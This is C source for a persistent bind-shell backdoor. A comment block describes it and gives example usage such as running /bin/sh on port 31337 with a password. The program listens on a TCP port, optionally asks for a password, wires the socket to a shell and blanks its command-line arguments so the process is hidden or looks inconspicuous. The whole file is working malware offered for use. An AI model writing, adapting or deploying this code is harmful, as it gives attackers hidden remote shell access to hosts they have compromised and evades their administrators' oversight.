 /*
          Compiles fine on *BSD*, Linux, and Solaris (on Solaris -lsocket)
          to hide the process i strcpy("", argv[count]);, making it
          invisible on Solaris and pretty inconspicuous on BSD and Linux.

          Basically, this binds a program to a specified port and listens
          for a connection.  When you exit the program, you DON'T get
          dropped to a shell, so you can let people bounce telnet
          connections off your box but not access anything else, or
          whatever.

          Example usage:
          ./backdoor /bin/sh 31337 p@55w0rd &
          or
          ./backdoor /bin/sh 31337
 */

#define DATA "Hello.  Please place semicolons after commands in shell mode :P\n---\n"
#include <sys/types.h>
#include <sys/socket.h>
#include <signal.h>
#include <netinet/in.h>

int sockfd, count, clientpid, socklen, serverpid, temp, temp2,temp3;
struct sockaddr_in  server_address;
struct sockaddr_in  client_address;

main(int argc, int **argv)
{
char password[ sizeof( argv[3] ) ];
char passwordchk[ sizeof( argv[3] ) ];

count=0;
if (argc < 3) {
        printf("usage: %s program_to_run port_number password(optional)\n",argv[0]);
        exit(-1);
        }
if (argc == 4)
        {
        strcpy((char *)&password, argv[3]);
        strcpy((char *)argv[3], "");
        }

printf("\n-----\nDaemon running %s on port %d.  PID is %d.\n-----\n",argv[1], atoi(argv[2]), getpid());
sockfd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); /*add error checking*/

bzero((char *) &server_address, sizeof(server_address));
strcpy((char *)argv[0],"");
server_address.sin_family=AF_INET;
server_address.sin_port=htons(atoi(argv[2]));
strcpy((char *)argv[2],"");
server_address.sin_addr.s_addr=htonl(INADDR_ANY);
bind(sockfd, (struct sockaddr *)&server_address, sizeof(server_address));

listen(sockfd, 5);
signal(SIGHUP, SIG_IGN);

while(1)
{
socklen=sizeof(client_address);
temp=accept(sockfd, (struct sockaddr *)&client_address,&socklen);

if(argc == 4)
{
while(1)
        {
        write(temp, "Password: ", 10);
        read(temp, &passwordchk, sizeof(password));
        if(strncmp(passwordchk, password, sizeof(password)) == 0)
                break;
        bzero(passwordchk,sizeof(passwordchk));
        }
}

write(temp, DATA, sizeof(DATA));
if (temp < 0) exit(0);
clientpid=getpid();
serverpid=fork();
if (serverpid != 0)
        {
        dup2(temp,0); dup2(temp,1); dup2(temp,2);
        execl(argv[1],argv[1],(char *)0);
        }
        close(temp);
        }
}
